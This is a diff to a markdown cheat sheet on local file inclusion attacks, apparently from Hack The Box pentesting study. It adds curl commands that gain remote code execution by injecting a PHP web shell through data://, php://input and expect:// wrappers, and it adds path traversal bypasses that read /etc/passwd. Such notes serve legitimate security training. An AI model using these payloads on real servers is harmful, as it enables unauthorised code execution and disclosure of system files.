@@ -44,6 +44,20 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
 expect://id  (needs expect extension)
 ```
 
+#### RCE
+
+```
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
+
+```
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+```
+
 ### Interesting Files to Target
 
 **Linux**
@@ -70,7 +84,7 @@ C:\inetpub\wwwroot\web.config
 C:\xampp\apache\conf\httpd.conf
 ```
 
-### LFI to RCE
+### LFI to [RCE](rce.md)
 
 - [ ] Log poisoning - inject PHP code into access logs, then include the log file
 - [ ] `/proc/self/environ` - inject code via User-Agent header
@@ -97,9 +111,15 @@ C:\xampp\apache\conf\httpd.conf
 ## Bypasses
 
 - [ ] Try double URL encoding
-- [ ] Try path normalization tricks (`....//....//`)
-- [ ] Try adding a null byte before the expected extension (`%00`)
+- [ ] Try path normalization tricks/non-recursive path traversal (`....//....//`)
+- [ ] Try adding a null byte before the expected extension (`/etc/passwd%00`)
+- [ ] Add the approved path - `./localization/../../../etc/passwd`
 - [ ] If extension is being appended, try truncation techniques
+
+```
+pawpawhacks@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done non_existing_directory/../../../etc/passwd/./././<SNIP>././././
+```
+
 - [ ] Try URL encoding just the dots or slashes
 - [ ] Check if the filter is case-sensitive
 
